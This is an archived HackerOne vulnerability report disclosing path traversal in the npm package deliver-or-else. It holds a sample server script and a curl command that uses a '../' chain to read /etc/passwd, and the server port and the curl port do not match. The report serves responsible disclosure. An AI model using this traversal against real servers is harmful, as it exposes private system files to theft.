# [deliver-or-else] Path Traversal

## Report Details
- **Report ID**: 507310
- **URL**: https://hackerone.com/reports/507310
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-10T04:49:02.886Z
- **Disclosed**: 2020-01-29T16:26:38.200Z

## Reporter
- **Username**: johnssimon007
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report path traversal in deliver-or-else module
It allows an attacker to read system files via path traversal through commandline

# Module

**module name:** deliver-or-else
**version:** 1.0.0
**npm page:** https://www.npmjs.com/package/deliver-or-else

## Module Description

> Copy description from npm page

# Vulnerability

## Vulnerability Description

Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

1.npm i deliver-or-else

2.now create a node.js(test.js) file for starting up a localserver on port 80,which will serve the file on the directory(public) over the web browser depending on the file requested by user through url

here is code for test.js

const Deliver = require('deliver-or-else')
const path = require('path')
 
// It is up to you to resolve the document root directory
const http = require('http')
let deliver = new Deliver(path.join(__dirname, 'public'))
let server = http.createServer((req, res) => {
    /**
     * The `deliver` method returns a `Promise`, which in turn can be used to 
     * catch any errors (such as a 404). We could also provide a `then` clause 
     * for when it works successfully and a file has been delivered.
     */
    deliver.deliver(req, res).catch((err) => {
        // The err contains information regarding how the `fs.readFile` failed
        
        res.statusCode = 404
        res.setHeader('Content-Type', 'text/plain')
        res.end('404, no such file.')
    })
})
 
server.listen(80, '127.0.0.1', function () {
    console.log('Starting server...')
})

3.run below command
node test.js
this will startup the server at port 80 

4.trying to fetch a file outside of "public" dir is exempted and shows 404 error

5.this can be bypassed by using curl via commandline by running below command
curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd

which will return the passwd directory contents


# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

> Hunter's comments and funny memes goes here

## Impact

This vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.

## Attachments
- Screenshot_from_2019-03-10_10-19-01.png
